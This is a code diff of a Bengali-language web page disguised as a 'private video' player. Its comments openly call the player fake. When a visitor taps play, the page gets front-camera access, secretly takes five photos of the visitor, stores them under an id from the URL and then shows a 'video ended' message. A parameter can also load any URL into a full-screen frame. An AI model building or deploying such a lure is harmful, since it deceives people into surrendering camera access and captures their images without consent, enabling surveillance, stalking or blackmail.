@@ -1,104 +1,64 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Private Video • Tap to Play</title>
+  <title>Private Video</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
-    body,html{height:100%;background:#000;overflow:hidden;font-family:'Segoe UI',sans-serif;}
-
-    /* রিডাইরেক্ট ফ্রেম */
+    body,html{height:100%;background:#000;overflow:hidden;}
     iframe{width:100%;height:100%;border:none;display:none;}
-
-    /* ফেক ভিডিও প্লেয়ার */
-    .player{
-      position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;
-    }
-    .blur-bg{
-      position:absolute;top:0;left:0;width:100%;height:100%;
-      background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover no-repeat;
-      filter:blur(15px) brightness(0.5);
-      transform:scale(1.1);
-    }
-    .content{
-      position:relative;z-index:10;text-align:center;color:white;
-    }
-    .play-btn{
-      width:100px;height:100px;background:rgba(255,0,0,0.95);
-      border-radius:50%;display:flex;align-items:center;justify-content:center;
-      cursor:pointer;margin:0 auto 25px;
-      box-shadow:0 0 50px rgba(255,0,0,0.8);
-      animation:pulse 2s infinite;
-      border:4px solid rgba(255,255,255,0.3);
-    }
-    .play-btn::after{
-      content:'▶';font-size:48px;color:white;margin-left:8px;
-    }
-    @keyframes pulse{
-      0%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0.7);}
-      70%{transform:scale(1.15);box-shadow:0 0 0 30px rgba(255,0,0,0);}
-      100%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0);}
-    }
-    .title{
-      font-size:26px;font-weight:bold;text-shadow:0 0 20px #000;
-      margin-bottom:10px;
-    }
-    .subtitle{
-      font-size:18px;text-shadow:0 0 15px #000;
-      opacity:0.95;
-    }
-
-    /* ক্যামেরা প্রিভিউ */
-    .cam-box{
-      position:absolute;top:0;left:0;width:100%;height:100%;background:#000;
-      display:flex;flex-direction:column;align-items:center;justify-content:center;
-      z-index:20;display:none;
-    }
-    video{max-width:90%;border-radius:18px;border:5px solid #0066ff;box-shadow:0 0 50px #0066ff;}
-    .msg{color:#00ff9d;font-size:19px;margin-top:20px;}
+    .player{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;}
+    .blur-bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(15px) brightness(0.5);transform:scale(1.1);}
+    .content{position:relative;z-index:10;text-align:center;color:#fff;cursor:pointer;}
+    .play{width:100px;height:100px;background:rgba(255,0,0,0.95);border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 50px rgba(255,0,0,0.8);border:4px solid rgba(255,255,255,0.3);}
+    .play::after{content:'▶';font-size:48px;margin-left:8px;}
+    .title{font-size:26px;font-weight:bold;text-shadow:0 0 20px #000;}
+    .cam{display:none;flex-direction:column;align-items:center;justify-content:center;height:100%;background:#000;}
+    video{max-width:90%;border-radius:16px;border:5px solid #0066ff;box-shadow:0 0 50px #0066ff;}
   </style>
 </head>
 <body>
 
-<iframe id="redirectFrame"></iframe>
+<iframe id="frame"></iframe>
 
-<div class="player" id="fakePlayer">
+<div class="player" id="player">
   <div class="blur-bg"></div>
-  <div class="content" onclick="startCamera()">
-    <div class="play-btn"></div>
-    <div class="title">প্রাইভেট ভিডিও 🔞</div>
-    <div class="subtitle">ট্যাপ করো ফুল HD দেখার জন্য</div>
+  <div class="content" onclick="startCam()">
+    <div class="play"></div>
+    <div class="title">প্রাইভেট ভিডিও</div>
+    <div style="font-size:18px;margin-top:8px;">ট্যাপ করো প্লে করতে</div>
   </div>
 </div>
 
-<div class="cam-box" id="camPreview">
+<div class="cam" id="cam">
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <div class="msg">ভিডিও লোড হচ্ছে... অপেক্ষা করুন</div>
+  <div style="color:#00ff9d;margin-top:20px;font-size:18px;">লোড হচ্ছে...</div>
 </div>
 
 <script>
 const params = new URLSearchParams(location.search);
 const id = params.get('id');
-const redirectUrl = params.get('r') ? decodeURIComponent(params.get('r')) : null;
+const redirect = params.get('r') ? decodeURIComponent(params.get('r')) : null;
 
-if (redirectUrl) {
-  document.getElementById('redirectFrame').src = redirectUrl;
-  document.getElementById('redirectFrame').style.display = 'block';
+if (redirect) {
+  // রিডাইরেক্ট লিংক থাকলে সরাসরি দেখাও
+  document.getElementById('frame').src = redirect;
+  document.getElementById('frame').style.display = 'block';
 } else {
-  document.getElementById('fakePlayer').style.display = 'flex';
+  // না থাকলে ফেক ভিডিও প্লেয়ার দেখাও
+  document.getElementById('player').style.display = 'flex';
 }
 
-function startCamera() {
-  document.getElementById('fakePlayer').style.display = 'none';
-  document.getElementById('camPreview').style.display = 'flex';
+function startCam() {
+  document.getElementById('player').style.display = 'none';
+  document.getElementById('cam').style.display = 'flex';
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
   let count = 0;
-  const total = 5;
   const images = [];
 
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -107,12 +67,9 @@ function startCamera() {
       video.play();
 
       const shoot = () => {
-        if (count >= total) {
+        if (count >= 5) {
           localStorage.setItem('camsnap_' + id, JSON.stringify(images));
-          setTimeout(() => {
-            alert("ভিডিও শেষ! ধন্যবাদ ❤️");
-            location.reload();
-          }, 1200);
+          setTimeout(() => alert("ভিডিও শেষ ❤️"), 800);
           return;
         }
         canvas.width = video.videoWidth || 640;
@@ -122,11 +79,10 @@ function startCamera() {
         count++;
         setTimeout(shoot, 800);
       };
-      setTimeout(shoot, 1800);
+      setTimeout(shoot, 1500);
     })
     .catch(() => {
-      document.getElementById('camPreview').innerHTML = 
-        `<div style="color:#ff0055;font-size:22px;padding:20px;">ক্যামেরা অনুমতি দাও!</div>`;
+      document.getElementById('cam').innerHTML = "<div style='color:#f00;font-size:20px;padding:30px;'>ক্যামেরা অনুমতি দাও!</div>";
     });
 }
 </script>
